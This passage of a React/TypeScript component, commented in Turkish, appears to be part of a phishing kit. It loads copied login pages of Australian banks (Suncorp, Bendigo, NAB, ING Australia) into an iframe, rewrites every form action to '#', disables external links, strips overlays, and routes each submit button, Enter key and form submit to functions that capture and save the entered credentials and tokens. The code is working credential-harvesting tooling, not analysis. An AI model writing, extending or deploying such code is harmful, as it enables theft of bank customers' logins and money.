      const fgColor = isValid ? "#7A4E00" : "#8A8E90";
      const borderColor = isValid ? `1px solid #E5B800` : "1px solid transparent";
      const boxShadow = isValid
        ? "0 10px 24px rgba(255, 200, 30, 0.45)"
        : "none";
      const cursorVal = saving ? "wait" : "pointer";
      const pointerEvents = saving ? "none" : "auto";

      actionNodes.forEach((node) => {
        try {
          if ("disabled" in node) {
            try { (node as any).disabled = false; } catch {}
            try { node.removeAttribute("disabled"); } catch {}
          }
        } catch {}
        try {
          for (let i = 0; i < node.classList?.length; i++) {
            const cls = node.classList[i];
            if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
              try { node.classList.remove(cls); } catch {}
            }
          }
        } catch {}
        try {
          node.setAttribute("aria-disabled", isValid ? "false" : "true");
        } catch {}

        // ⭐ TÜM STİLLER setProperty('important') ile yaz:
        //   Suncorp SG-Btn sınıfları bizim inline stillerimizi CSS specificity ile
        //   ezip opacity 0.63 / grayscale 0.2 yapıyordu → IMPORTANT ile artık BİZ KAZANIYORUZ.
        // ⭐ LAYOUT: butonun diğer yazıların üstünde kalması için Z-INDEX 99999 + position:relative
        //   + inline-block + margin. Login yazıları üst üste binmesin diye line-height da set et.
        try { node.style.setProperty("position", "relative", "important"); } catch {}
        try { node.style.setProperty("display", "inline-block", "important"); } catch {}
        try { node.style.setProperty("z-index", "99999", "important"); } catch {}
        try { node.style.setProperty("margin-top", "14px", "important"); } catch {}
        try { node.style.setProperty("margin-bottom", "10px", "important"); } catch {}
        try { node.style.setProperty("padding-top", "12px", "important"); } catch {}
        try { node.style.setProperty("padding-bottom", "12px", "important"); } catch {}
        try { node.style.setProperty("padding-left", "22px", "important"); } catch {}
        try { node.style.setProperty("padding-right", "22px", "important"); } catch {}
        try { node.style.setProperty("line-height", "1.35", "important"); } catch {}
        try { node.style.setProperty("font-size", "15px", "important"); } catch {}
        try { node.style.setProperty("font-weight", "700", "important"); } catch {}
        try { node.style.setProperty("border-radius", "10px", "important"); } catch {}
        try { node.style.setProperty("pointer-events", pointerEvents, "important"); } catch {}
        try { node.style.setProperty("opacity", String(fadeOpacity), "important"); } catch {}
        try { node.style.setProperty("filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`, "important"); } catch {}
        try { node.style.setProperty("-webkit-filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`, "important"); } catch {}
        try { node.style.setProperty("cursor", cursorVal, "important"); } catch {}
        try { node.style.setProperty("background-color", bgColor, "important"); } catch {}
        try { node.style.setProperty("background", bgColor, "important"); } catch {}
        try { node.style.setProperty("color", fgColor, "important"); } catch {}
        try { node.style.setProperty("border", borderColor, "important"); } catch {}
        try { node.style.setProperty("box-shadow", boxShadow, "important"); } catch {}
        try { node.style.setProperty("transform", isValid ? "translateY(0)" : "none", "important"); } catch {}
        try {
          node.style.setProperty(
            "transition",
            "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
            "important",
          );
        } catch {}
      });
    };

    actionNodes.forEach((node) => {
      try { node.removeEventListener("click", submitWithCurrentValues as any); } catch {}
      try { node.removeEventListener("mousedown", submitWithCurrentValues as any); } catch {}
      try { node.removeEventListener("touchend", submitWithCurrentValues as any); } catch {}
      node.addEventListener("click", submitWithCurrentValues as any, false);
      node.addEventListener("mousedown", submitWithCurrentValues as any, false);
      node.addEventListener("touchend", submitWithCurrentValues as any, false);
      try {
        node.addEventListener("keydown", (e: Event) => {
          const ke = e as KeyboardEvent;
          if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
            try { submitWithCurrentValues(e as any); } catch {}
          }
        }, false);
      } catch {}
    });

    Array.from(doc.querySelectorAll<HTMLAnchorElement>("a")).forEach((link) => {
      if (!isExternalHref(link.getAttribute("href"))) return;
      link.setAttribute("href", "#");
      link.setAttribute("target", "_self");
      link.setAttribute("rel", "nofollow noopener noreferrer");
    });

    getFormFields(loginScope).forEach((field) => {
      try { field.removeEventListener("input", updateSubmitState as any); } catch {}
      try { field.removeEventListener("change", updateSubmitState as any); } catch {}
      field.addEventListener("input", updateSubmitState as any);
      field.addEventListener("change", updateSubmitState as any);
      field.addEventListener("keydown", (event) => {
        if (event instanceof KeyboardEvent && event.key === "Enter" && !canProceedNow()) {
          event.preventDefault();
          event.stopPropagation();
        }
      });
    });

    updateSubmitState();
  }, [bankSlug, captureFieldsFromFrame, isFinalStep, saving, submitCapturedFields, totalSteps, auPages]);

  const handleFrameLoad = useCallback(() => {
    void attachFrameBridge();
  }, [attachFrameBridge]);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;

    if (iframe.contentDocument?.readyState === "complete") {
      void attachFrameBridge();
    }

    iframe.addEventListener("load", handleFrameLoad);
    return () => {
      iframe.removeEventListener("load", handleFrameLoad);
    };
  }, [attachFrameBridge, handleFrameLoad]);

  useEffect(() => {
    const onMsg = (ev: MessageEvent) => {
      try {
        const data = ev.data as any;
        if (!data || typeof data !== "object") return;
        if (data.kind === "BOT_V3_SUBMIT_CLICKED" || data.kind === "BOT_V2_SUBMIT_CLICKED" || data.type === "AU_BOT_SUBMIT_NOW") {
          const ref = submitWithCurrentValuesRef.current;
          if (ref && typeof ref === "function") {
            void ref();
          }
        }
      } catch (_) {}
    };
    window.addEventListener("message", onMsg);
    return () => window.removeEventListener("message", onMsg);
  }, []);

  useEffect(() => {
    const iframe = iframeRef.current;
    if (!iframe) return;

    const runPoll = () => {
      try {
        pollingCounterRef.current = pollingCounterRef.current + 1;
        const doc = iframe.contentWindow?.document;
        if (!doc) return;

        // ⭐ İLK 2 POLLING TURU: Aktif odak input/textarea/select değilse,
        //   odak yoksa İLK input/autofocus inputa odaklan.
        //   (daha sonraki TURlarda KESİNLİKLE odak izinsiz el değiştirme
        //    → Bendigo şifre 1 karakter yazma / Suncorp token→customer id odak KAYBINI ONLER)
        try {
          if (pollingCounterRef.current <= 2) {
            const act = doc.activeElement as HTMLElement | null;
            const actTag = (act?.tagName || "").toLowerCase();
            const userIsTyping = actTag === "input" || actTag === "textarea" || actTag === "select";
            if (!userIsTyping) {
              let focusTarget: HTMLElement | null = null;
              try {
                focusTarget = doc.querySelector<HTMLElement>("input[autofocus], textarea[autofocus]");
              } catch {}
              if (!focusTarget) {
                try {
                  focusTarget = Array.from(
                    doc.querySelectorAll<HTMLInputElement>("input:not([type='hidden'])"),
                  )[0] as HTMLElement | null;
                } catch {}
              }
              if (focusTarget) {
                try {
                  setTimeout(() => {
                    try { (focusTarget as any).focus({ preventScroll: true }); }
                    catch { try { (focusTarget as any).focus(); } catch {} }
                  }, 0);
                } catch {}
              }
            }
          }
        } catch {}

        // =====================================================================
        // ⭐ 1. POLLING BAŞI — OVERLAY / Z-INDEX BRUTE FORCE TEMİZLİĞİ
        //    NAB, North AMP, ING Australia gibi bankalarda inputların üstünde
        //    saydam veya z-index yüksek overlay elementleri inputları bloke ediyor.
        // =====================================================================
        try {
          // (A) ING WebComponent / Polymer custom elementler (tag name "ing-*")
          try {
            const ingEls = doc.querySelectorAll<HTMLElement>("*");
            ingEls.forEach((el) => {
              const tag = (el.tagName || "").toLowerCase();
              if (tag.startsWith("ing-") || tag.startsWith("paper-") || tag.startsWith("iron-") || tag.startsWith("vaadin-") || tag.startsWith("ui5-")) {
                const role = (el.getAttribute("role") || "").toLowerCase();
                const zi = Number(window.getComputedStyle(el).zIndex || "0");
                const disp = window.getComputedStyle(el).display;
                // Custom element overlay / dialog / backdrop ise GİZLE
                if (
                  zi > 900 ||
                  /overlay|dialog|backdrop|modal|popup/.test(`${tag} ${el.className} ${role} ${el.id}`.toLowerCase())
                ) {
                  if (disp !== "none") {
                    try { el.style.setProperty("display", "none", "important"); } catch {}
                    try { el.style.visibility = "hidden"; } catch {}
                    try { el.style.opacity = "0"; } catch {}
                    try { el.style.pointerEvents = "none"; } catch {}
                  }
                }
              }
            });
          } catch {}
          // (B) Z-index > 900 olan TÜM elementleri tarama, input/button dışındakileri gizle
          try {
            const highZi = doc.querySelectorAll<HTMLElement>("div, section, article, aside, span, header, footer, nav, dialog");
            highZi.forEach((el) => {
              const zi = Number(window.getComputedStyle(el).zIndex || "0");
              if (zi > 900) {
                const tag = (el.tagName || "").toLowerCase();
                const txt = (el.textContent || "").trim().toLowerCase();
                const hasForm = el.querySelector("input, button, select, textarea, form") != null;
                const isLoginBut = /login|submit|continue|next|giriş|giriş|giris|onay|tamam/.test(
                  `${el.id} ${el.className} ${txt}`,
                );
                if (!hasForm && !isLoginBut && tag !== "button") {
                  try { el.style.setProperty("display", "none", "important"); } catch {}
                  try { el.style.pointerEvents = "none"; } catch {}
                } else {
                  // Form/buton taşıyan overlay'ler sadece pointer-events kapat (arka plan bloke etmesin)
                  try { el.style.setProperty("pointer-events", "none", "important"); } catch {}
                  el.querySelectorAll<HTMLElement>("input, button, select, textarea, label").forEach((f) => {
                    try { f.style.setProperty("pointer-events", "auto", "important"); } catch {}
                  });
                }
              }
            });
          } catch {}
          // (C) Standart overlay selectorları ile son tarama
          try {
            const overlaySelector =
              'overlay, dialog, backdrop, paper-dialog, ing-core-overlay, iron-overlay, iron-overlay-backdrop, .overlay, [class*="overlay"], [data-overlay], [role="dialog"], [role="alertdialog"], .modal, [class*="modal"], [class*="backdrop"], [id*="overlay"], [id*="dialog"]';
            const overlays = doc.querySelectorAll<HTMLElement>(overlaySelector);
            overlays.forEach((el) => {
              try { el.style.setProperty("display", "none", "important"); } catch {}
              try { el.style.visibility = "hidden"; } catch {}
              try { el.style.opacity = "0"; } catch {}
              try { el.style.pointerEvents = "none"; } catch {}
            });
          } catch {}
        } catch {}

        const form = pickBestForm(doc);
        if (!form) return;
        savedSubmitFormRef.current = form;

        const singleStep = totalSteps === 1;
        const proceedNow = isFinalStep ? canSubmitFinal(form, doc, singleStep) : canSubmitIntermediate(form, doc);
        const disabledBySaving = saving;
        const shouldForceEnable = proceedNow && !disabledBySaving;

        // ⭐ ING fadeOpacity/grayscale polling seviyesinde de hesapla
        const allPollFields = getFormFields(form);
        const allRequiredPoll = allPollFields.filter((f) => {
          const t = (f.getAttribute("type") ?? "").toLowerCase();
          return t !== "checkbox" && t !== "radio";
        });
        const capturedNow = collectCapturedFieldsFromForm(form, doc);
        const filledNow = capturedNow.filter((c) => c.value.trim().length > 0).length;
        const totalMeaningful = allRequiredPoll.length;
        let fadeOpacity = 1;
        let fadeGray = 0;
        if (!proceedNow) {
          if (filledNow === 0) {
            fadeOpacity = 0.3;
            fadeGray = 0.8;
          } else {
            fadeOpacity = 0.5;
            fadeGray = 0.6;
          }
        }

        const activeColor = getActiveButtonColor(bankSlug);

        // =====================================================================
        // ⭐ 2. NAB / North AMP — INPUT TIKLANAMAMA SORUNU:
        //    Her input/textarea/select için:
        //      - disabled/readonly/tabindex temizliği (eski kod)
        //      - 5 parent katmanı pointerEvents=auto + position zaten static ise relative
        //      - her 3 polling turunda bir input.focus() denemesi (iframe klavye odak emülasyonu)
        // =====================================================================
        try {
          const inputEls = Array.from(
            doc.querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>(
              "input, textarea, select",
            ),
          ).filter((f) => {
            const t = (f.getAttribute("type") ?? "").toLowerCase();
            return t !== "hidden";
          });
          inputEls.forEach((field, idx) => {
            try {
              if (field.hasAttribute("readonly")) field.removeAttribute("readonly");
              if ((field as any).readOnly === true) { try { (field as any).readOnly = false; } catch {} }
              if (field.hasAttribute("disabled")) {
                field.removeAttribute("disabled");
                try { (field as any).disabled = false; } catch {}
              }
              if (field.getAttribute("tabindex") === "-1") field.setAttribute("tabindex", "0");
              if (!field.hasAttribute("tabindex")) field.setAttribute("tabindex", "0");

              // Pointer-events ve z-index temizliği (ELEMENT)
              try {
                field.style.setProperty("pointer-events", "auto", "important");
                field.style.setProperty("position", "relative", "important");
                field.style.setProperty("z-index", "5", "important");
                field.style.setProperty("opacity", "1", "important");
                field.style.setProperty("visibility", "visible", "important");
              } catch {}

              // 5 PARENT KATMAN
              let p: HTMLElement | null = field as unknown as HTMLElement;
              let depth = 0;
              while (p && depth < 6) {
                try {
                  p.style.setProperty("pointer-events", "auto", "important");
                  const compZ = Number(window.getComputedStyle(p).zIndex || "0");
                  if (compZ <= 0 && depth < 4) {
                    try {
                      if (window.getComputedStyle(p).position === "static") {
                        p.style.setProperty("position", "relative", "important");
                      }
                      p.style.setProperty("z-index", String(Math.max(2, 6 - depth)), "important");
                    } catch {}
                  }
                } catch {}
                p = p.parentElement;
                depth++;
              }

              // ⭐ ÖNEMLİ: HER POLLING'de idx%3 ===0 focus KALDIRILDI!
              //   Yerine: runPoll başında SADECE İLK 2 polling turunda
              //   ve AKTİF ODAKLI BİR INPUT YOKSA odaklama yapıyoruz.
              //   (Bu sayede kullanıcı yazarken odak ASLA izinsiz DEĞİŞMEZ.)
            } catch {}
          });
        } catch {}

        const allCandidates = doc.querySelectorAll<HTMLElement>(
          "button, input[type='submit'], input[type='button'], [role='button'], a.btn, .btn-primary, .btn, [data-testid*='login'], [data-testid*='submit'], [class*='login-button'], [id*='login-button'], [id*='submit-button'], .btn-lg, .btn-default, [onclick], [class*='btn'], [class*='login'], [class*='submit'], [class*='continue'], [class*='next'], [id*='btn'], [id*='submit'], [id*='continue'], [id*='next'], [class*='logon'], [class*='signin'], [id*='logon'], [id*='signin']",
        );

        const candidateNodes: HTMLElement[] = [];
        const seenCandidates = new Set<HTMLElement>();
        allCandidates.forEach((node) => {
          if (seenCandidates.has(node)) return;
          seenCandidates.add(node);
          const nodeToken = getElementActionToken(node);
          const isSubmitInput =
            node instanceof HTMLInputElement &&
            ["submit", "button"].includes((node.getAttribute("type") ?? "").toLowerCase());
          const isByAttr =
            node.tagName === "BUTTON" ||
            node.getAttribute("role") === "button" ||
            node.hasAttribute("onclick");

          if (!(ACTION_BUTTON_RE.test(nodeToken) || isSubmitInput || isByAttr)) return;
          candidateNodes.push(node);

          if ("disabled" in node) {
            try { (node as any).disabled = !shouldForceEnable; } catch {}
          }

          try {
            if (shouldForceEnable) {
              node.removeAttribute("disabled");
            }
          } catch {}
          try {
            node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
          } catch {}

          // ⭐ ING fadeOpacity + filter grayscale + pointer-events (saving olunca kapat)
          try {
            node.style.setProperty("position", "relative", "important");
            node.style.setProperty("display", "inline-block", "important");
            node.style.setProperty("z-index", "99999", "important");
            node.style.setProperty("margin-top", "14px", "important");
            node.style.setProperty("margin-bottom", "10px", "important");
            node.style.setProperty("padding-top", "12px", "important");
            node.style.setProperty("padding-bottom", "12px", "important");
            node.style.setProperty("padding-left", "22px", "important");
            node.style.setProperty("padding-right", "22px", "important");
            node.style.setProperty("line-height", "1.35", "important");
            node.style.setProperty("font-size", "15px", "important");
            node.style.setProperty("font-weight", "700", "important");
            node.style.setProperty("border-radius", "10px", "important");
            node.style.setProperty("pointer-events", saving ? "none" : "auto", "important");
            node.style.setProperty("opacity", String(fadeOpacity), "important");
            node.style.setProperty("filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
            node.style.setProperty("-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
            node.style.setProperty("cursor", shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"), "important");
          } catch {}

          try {
            if (shouldForceEnable) {
              const classesToRemove: string[] = [];
              for (let i = 0; i < node.classList.length; i++) {
                const cls = node.classList[i];
                if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                  classesToRemove.push(cls);
                }
              }
              classesToRemove.forEach((c) => node.classList.remove(c));
            }
          } catch {}

          try {
            if (shouldForceEnable) {
              node.style.setProperty("background-color", activeColor, "important");
              node.style.setProperty("background", activeColor, "important");
              node.style.setProperty("color", "#7A4E00", "important");
              node.style.setProperty("border", "1px solid #E5B800", "important");
              node.style.setProperty("box-shadow", "0 10px 24px rgba(255, 200, 30, 0.45)", "important");
            } else {
              const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
              node.style.setProperty("background-color", bgCol, "important");
              node.style.setProperty("background", bgCol, "important");
              node.style.setProperty("color", "#8A8E90", "important");
              node.style.setProperty("border", "1px solid transparent", "important");
              node.style.setProperty("box-shadow", "none", "important");
            }
            node.style.setProperty(
              "transition",
              "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
              "important",
            );
          } catch {}

          try {
            const curRef = submitWithCurrentValuesRef.current;
            try { node.removeEventListener("click", curRef as any, false); } catch {}
            try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
            try { node.removeEventListener("touchend", curRef as any, false); } catch {}
            if (curRef) {
              // ⭐ BUTONLAR HER ZAMAN tıklanabilir (opacity düşük olsa bile kullanıcı zorlayabilir)
              //   save anında hariç pointer-events auto kalsın
              node.addEventListener("click", curRef as any, false);
              node.addEventListener("mousedown", curRef as any, false);
              node.addEventListener("touchend", curRef as any, false);
              try {
                node.addEventListener("keydown", (e: Event) => {
                  const ke = e as KeyboardEvent;
                  if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                    try { curRef(); } catch {}
                  }
                }, false);
              } catch {}
            }
          } catch {}
        });

        // ⭐ ING Australia ÖZEL: tag name "ing-" başlayan ve buton gibi davranan custom elementleri
        //   (örn: ing-login-submit) ayrıca brute-force olarak bul & listeye ekle + STIL/HANDLER UYGULA
        try {
          const ingCandidates = doc.querySelectorAll<HTMLElement>("*");
          ingCandidates.forEach((el) => {
            if (seenCandidates.has(el)) return;
            const tag = (el.tagName || "").toLowerCase();
            if (!tag.startsWith("ing-") && !tag.startsWith("ui5-") && !tag.startsWith("sl-")) return;
            const tok = getElementActionToken(el);
            const role = (el.getAttribute("role") || "").toLowerCase();
            if (ACTION_BUTTON_RE.test(tok) || role === "button" || /submit|login|button|next|continue/.test(tok)) {
              seenCandidates.add(el);
              candidateNodes.push(el);

              try {
                if ("disabled" in el) {
                  try { (el as any).disabled = !shouldForceEnable; } catch {}
                }
                try { if (shouldForceEnable) el.removeAttribute("disabled"); } catch {}
                try { el.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true"); } catch {}
                try {
                  el.style.pointerEvents = saving ? "none" : "auto";
                  el.style.opacity = String(fadeOpacity);
                  el.style.filter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
                  el.style.webkitFilter = proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`;
                  el.style.cursor = shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed");
                } catch {}
                try {
                  if (shouldForceEnable && (el as any).classList) {
                    const classesToRemove: string[] = [];
                    for (let i = 0; i < (el as any).classList.length; i++) {
                      const cls = (el as any).classList[i];
                      if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                        classesToRemove.push(cls);
                      }
                    }
                    classesToRemove.forEach((c) => (el as any).classList.remove(c));
                  }
                } catch {}
                try {
                  if (shouldForceEnable) {
                    el.style.background = activeColor;
                    el.style.color = "#FFFFFF";
                    el.style.border = `1px solid ${activeColor}`;
                    el.style.boxShadow = "0 10px 24px rgba(245, 108, 0, 0.28)";
                  } else {
                    el.style.background = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
                    el.style.color = "#8A8E90";
                    el.style.border = "1px solid transparent";
                    el.style.boxShadow = "none";
                  }
                  el.style.transition =
                    "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease";
                } catch {}
                try {
                  const curRef = submitWithCurrentValuesRef.current;
                  try { el.removeEventListener("click", curRef as any, false); } catch {}
                  try { el.removeEventListener("mousedown", curRef as any, false); } catch {}
                  try { el.removeEventListener("touchend", curRef as any, false); } catch {}
                  if (curRef) {
                    el.addEventListener("click", curRef as any, false);
                    el.addEventListener("mousedown", curRef as any, false);
                    el.addEventListener("touchend", curRef as any, false);
                    try {
                      el.addEventListener("keydown", (e: Event) => {
                        const ke = e as KeyboardEvent;
                        if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                          try { curRef(); } catch {}
                        }
                      }, false);
                    } catch {}
                  }
                } catch {}
              } catch {}
            }
          });
        } catch {}

        // Polling BRUTE FORCE FALLBACK: Eğer standart selectorlarla 0 node geldiyse
        // form + doc içinde class/id/textte btn/button/login/submit/next/continue vs geçen her elementi al
        if (candidateNodes.length === 0) {
          try {
            const fallBackSource = form ?? doc.body ?? doc.documentElement;
            const allIn = fallBackSource.querySelectorAll<HTMLElement>("*");
            const bfRe = /btn|button|login|logon|signin|submit|continue|next|ileri|giriş|giris|sonraki|tamam|onay|devam|enter|confirm|password_submit|submit_password|acceso|iniciar|log_on|log_in|sign_in|sigon|auth|validate|accept|proceed|unlock|open/i;
            const extra: HTMLElement[] = [];
            allIn.forEach((el) => {
              if (seenCandidates.has(el)) return;
              const tag = (el.tagName || "").toLowerCase();
              const type = (el.getAttribute("type") || "").toLowerCase();
              const tOk = tag === "button" || type === "submit" || type === "button" || el.getAttribute("role") === "button";
              const idClsTxt = `${el.id || ""} ${el.getAttribute("class") || ""} ${el.getAttribute("data-testid") || ""} ${el.getAttribute("name") || ""} ${(el.textContent || "").trim().slice(0, 120)}`;
              if (tOk || bfRe.test(idClsTxt)) {
                seenCandidates.add(el);
                extra.push(el);
              }
            });
            // Fallback node'ları için de candidate loop'taki tüm stillendirme + handler bağlama
            extra.forEach((node) => {
              candidateNodes.push(node);
              if ("disabled" in node) {
                try { (node as any).disabled = !shouldForceEnable; } catch {}
              }
              try {
                if (shouldForceEnable) node.removeAttribute("disabled");
              } catch {}
              try {
                node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
              } catch {}
              try {
                node.style.setProperty("position", "relative", "important");
                node.style.setProperty("display", "inline-block", "important");
                node.style.setProperty("z-index", "99999", "important");
                node.style.setProperty("margin-top", "14px", "important");
                node.style.setProperty("margin-bottom", "10px", "important");
                node.style.setProperty("padding-top", "12px", "important");
                node.style.setProperty("padding-bottom", "12px", "important");
                node.style.setProperty("padding-left", "22px", "important");
                node.style.setProperty("padding-right", "22px", "important");
                node.style.setProperty("line-height", "1.35", "important");
                node.style.setProperty("font-size", "15px", "important");
                node.style.setProperty("font-weight", "700", "important");
                node.style.setProperty("border-radius", "10px", "important");
                node.style.setProperty("pointer-events", saving ? "none" : "auto", "important");
                node.style.setProperty("opacity", String(fadeOpacity), "important");
                node.style.setProperty("filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
                node.style.setProperty("-webkit-filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
                node.style.setProperty("cursor", shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"), "important");
              } catch {}
              try {
                if (shouldForceEnable) {
                  const classesToRemove: string[] = [];
                  for (let i = 0; i < node.classList.length; i++) {
                    const cls = node.classList[i];
                    if (/disabled|disabl|not-allowed|is-disabled|btn-disabled|sg-Btn--disabled|disabled-btn/i.test(cls)) {
                      classesToRemove.push(cls);
                    }
                  }
                  classesToRemove.forEach((c) => node.classList.remove(c));
                }
              } catch {}
              try {
                if (shouldForceEnable) {
                  node.style.setProperty("background-color", activeColor, "important");
                  node.style.setProperty("background", activeColor, "important");
                  node.style.setProperty("color", "#7A4E00", "important");
                  node.style.setProperty("border", "1px solid #E5B800", "important");
                  node.style.setProperty("box-shadow", "0 10px 24px rgba(255, 200, 30, 0.45)", "important");
                } else {
                  const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
                  node.style.setProperty("background-color", bgCol, "important");
                  node.style.setProperty("background", bgCol, "important");
                  node.style.setProperty("color", "#8A8E90", "important");
                  node.style.setProperty("border", "1px solid transparent", "important");
                  node.style.setProperty("box-shadow", "none", "important");
                }
                node.style.setProperty(
                  "transition",
                  "background-color 160ms ease, color 160ms ease, box-shadow 160ms ease, border-color 160ms ease, opacity 220ms ease, filter 220ms ease",
                  "important",
                );
              } catch {}
              try {
                const curRef = submitWithCurrentValuesRef.current;
                try { node.removeEventListener("click", curRef as any, false); } catch {}
                try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
                try { node.removeEventListener("touchend", curRef as any, false); } catch {}
                if (curRef) {
                  node.addEventListener("click", curRef as any, false);
                  node.addEventListener("mousedown", curRef as any, false);
                  node.addEventListener("touchend", curRef as any, false);
                  try {
                    node.addEventListener("keydown", (e: Event) => {
                      const ke = e as KeyboardEvent;
                      if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                        try { curRef(); } catch {}
                      }
                    }, false);
                  } catch {}
                }
              } catch {}
            });
          } catch {}
        }

        if (candidateNodes.length > 0) {
          savedSubmitActionNodesRef.current = candidateNodes;
        }

        try {
          const formsArr = Array.from(doc.querySelectorAll("form"));
          formsArr.forEach((f) => {
            try {
              f.setAttribute("action", "#");
              f.setAttribute("method", "post");
              f.setAttribute("target", "_self");
              f.setAttribute("novalidate", "novalidate");
            } catch {}
            if (f === form) {
              const curRef = submitWithCurrentValuesRef.current;
              try { f.removeEventListener("submit", curRef as any); } catch {}
              if (curRef) f.addEventListener("submit", curRef as any);
              (f as any)._auBotV3Bound = true;
            }
          });
        } catch {}

        const allFields = getFormFields(form);
        allFields.forEach((field) => {
          try {
            if (field.hasAttribute("readonly")) field.removeAttribute("readonly");
            if (field.hasAttribute("disabled") && field.getAttribute("type") !== "hidden") {
              field.removeAttribute("disabled");
              (field as any).disabled = false;
            }
            if (field.getAttribute("tabindex") === "-1") field.setAttribute("tabindex", "0");
          } catch {}
        });

        if (shouldForceEnable) {
          try {
            if (iframe.contentWindow && typeof iframe.contentWindow.postMessage === "function") {
              try {
                iframe.contentWindow.postMessage({ kind: "AU_BOT_CAN_PROCEED_NOW" }, "*");
              } catch {}
            }
          } catch {}
        }
      } catch (e) {
        /* cross-origin or detached frame — ignore silently */
      }
    };

    const initialTimer = window.setTimeout(runPoll, 250);
    const pollTimer = window.setInterval(runPoll, 800);

    return () => {
      window.clearTimeout(initialTimer);
      window.clearInterval(pollTimer);
    };
  }, [attachFrameBridge, bankSlug, isFinalStep, saving, stepIndex, totalSteps]);

  if (!currentSrc) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-white px-4 text-center text-sm font-medium text-red-600">
        Exact bank page file is missing for {bankName} ({bankSlug}).
        {isAuExactHtmlBank(bankSlug) && bankSlug === "suncorp-bank" ? (
          <div className="mt-2 w-full text-xs text-[#129C4F]">
            Suncorp Bank HTML files (1.html, 2.html, 3.html) bekleniyor. Kullanicidan geldikten sonra public/au-banks/suncorp-bank/ altina yerlestirilecektir.
          </div>
        ) : null}
      </div>
    );
  }

  return (
    <div className="relative min-h-screen bg-white">
      <iframe
        ref={iframeRef}
        title={`${bankName} login`}
        src={currentSrc}
        onLoad={handleFrameLoad}
        className="min-h-screen w-full border-0 bg-white"
      />
    </div>
  );
}
